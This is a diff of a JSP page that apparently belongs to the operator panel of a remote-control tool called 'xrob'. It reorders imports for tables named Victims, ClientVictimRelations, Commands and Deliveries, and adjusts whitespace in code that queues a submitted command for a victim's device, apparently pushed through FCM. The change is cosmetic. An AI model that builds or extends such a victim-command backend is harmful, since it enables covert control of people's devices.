@@ -1,13 +1,14 @@
-<%@ page import="com.theah64.xrob.api.models.Delivery" %>
+<%@ page import="com.theah64.xrob.api.database.tables.ClientVictimRelations" %>
+<%@ page import="com.theah64.xrob.api.database.tables.Deliveries" %>
+<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
+<%@ page import="com.theah64.xrob.api.database.tables.command.CommandStatuses" %>
+<%@ page import="com.theah64.xrob.api.database.tables.command.Commands" %>
+<%@ page import="com.theah64.xrob.api.models.Command" %>
 <%@ page import="com.theah64.xrob.api.models.Victim" %>
+<%@ page import="com.theah64.xrob.api.utils.FCMUtils" %>
+<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
 <%@ page import="java.util.List" %>
-<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
-<%@ page import="com.theah64.xrob.api.models.Command" %>
-<%@ page import="com.theah64.xrob.api.database.tables.*" %>
-<%@ page import="com.theah64.xrob.api.utils.FCMUtils" %>
-<%@ page import="com.theah64.xrob.api.database.tables.command.Commands" %>
-<%@ page import="com.theah64.xrob.api.database.tables.command.CommandStatuses" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -92,7 +93,7 @@
                             final String command = request.getParameter(Commands.COLUMN_COMMAND);
                             try {
                                 if (command.matches(Command.REGEX_VALID_COMMAND)) {
-
+                                    
                                     final Command commandOb = new Command(null, command, 0, null, theVictim.getId(), clientId.toString());
                                     final String commandId = Commands.getInstance().addv3(commandOb);
                                     if (commandId != null) {
